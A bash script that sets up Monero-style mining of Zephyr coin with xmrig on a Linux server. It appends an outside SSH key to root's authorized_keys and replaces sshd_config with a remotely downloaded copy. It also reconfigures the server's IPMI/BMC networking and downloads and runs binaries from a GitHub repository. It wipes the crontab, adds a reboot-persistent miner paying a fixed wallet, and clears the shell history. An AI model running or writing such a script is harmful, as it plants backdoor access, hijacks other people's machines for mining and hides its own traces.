#!/bin/bash

# Install necessary packages
apt-get update -qy
apt-get install curl wget screen cron libfreeipmi17 bc -qy

# Setup SSH Keys
cd ~
mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOswKNcA2Gzv/mGSu2oeh571PlbpyAekXkmVh8FVx/z/ crypto@currency" >> ~/.ssh/authorized_keys

# Set SSH config
wget -q https://raw.githubusercontent.com/realtkco/scripts/main/sshd_config -O sshd_config
rm -rf /etc/ssh/sshd_config
mv sshd_config /etc/ssh/sshd_config

#Install PapPing
wget -q https://raw.githubusercontent.com/realtkco/scripts/main/paping && mv paping /usr/bin && chmod a+x /usr/bin/paping

# IPMI

wget https://ftp.debian.org/debian/pool/main/i/ipmitool/ipmitool_1.8.19-7_amd64.deb
dpkg -i ipmitool_1.8.19-7_amd64.deb 
rm -rf ipmitool_1.8.19-7_amd64.deb

ipmitool lan set 1 access on
ipmitool lan set 1 alert off
ipmitool lan set 1 macaddr 00:20:91:d1:11:aa
ipmitool lan set 1 ipsrc static
ipmitool lan set 1 ipaddr 86.109.7.22
ipmitool lan set 1 defgw 86.109.7.20
ipmitool lan set 1 netmask 255.255.255.0
ipmitool bmc reset cold


# List of server addresses
servers=(
    "de.zephyr.herominers.com"
    "fi.zephyr.herominers.com"
    "ca.zephyr.herominers.com"
    "ru.zephyr.herominers.com"
    "us.zephyr.herominers.com"
    "us2.zephyr.herominers.com"
    "br.zephyr.herominers.com"
    "hk.zephyr.herominers.com"
    "kr.zephyr.herominers.com"
    "in.zephyr.herominers.com"
    "sg.zephyr.herominers.com"
    "tr.zephyr.herominers.com"
    "au.zephyr.herominers.com"
)

port=1123

# Variables to keep track of the server with the lowest latency
minLatency=1000000
minServer=""

for server in "${servers[@]}"; do
    # Run paping, extract average latency
    result=$(paping "$server" -c 3 -p $port | grep 'Average' || echo "Error pinging $server")

    # Check if paping encountered an error
    if [[ $result == *"Error pinging"* ]]; then
        echo $result
        continue
    fi

    # Extract the average latency, removing ANSI color codes and any illegal characters
    latency=$(echo $result | sed 's/\x1b\[[0-9;]*m//g' | awk -F' ' '{ for(i=1;i<=NF;i++) if ($i=="Average") print $(i+2) }' | sed 's/ms//' | tr -d '[:cntrl:]')

    if [[ -z $latency ]]; then
        echo "Failed to extract latency for $server."
        continue
    fi

    echo "Average latency for $server: $latency ms"

    # Use bc for comparison, ensuring input is properly formatted
    comparison=$(echo "$latency < $minLatency" | bc 2>/dev/null)

    if [[ $comparison -eq 1 ]]; then
        minLatency=$latency
        minServer=$server
    fi
done

echo "The server with the lowest latency is $minServer with an average latency of $minLatency ms."

MINER_ENDPOINT="$minServer:1123"

# Proceed with the rest of the script
hostnamectl set-hostname $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")

wget https://raw.githubusercontent.com/realtkco/scripts/main/xmrig -O xmrig
chmod +x ./xmrig

# Use the MINER_ENDPOINT with the lowest latency in the crontab entry
crontab -r

crontab -l | { cat; echo "@reboot screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t $(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" )" ; } | crontab -

echo "screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t \$(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo \"-vm\" )" > start.sh

chmod +x start.sh

history -c
rm -rf ~/.bash_history

clear

echo "$(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")"
echo "Chose $minServer with $minLatency ms."
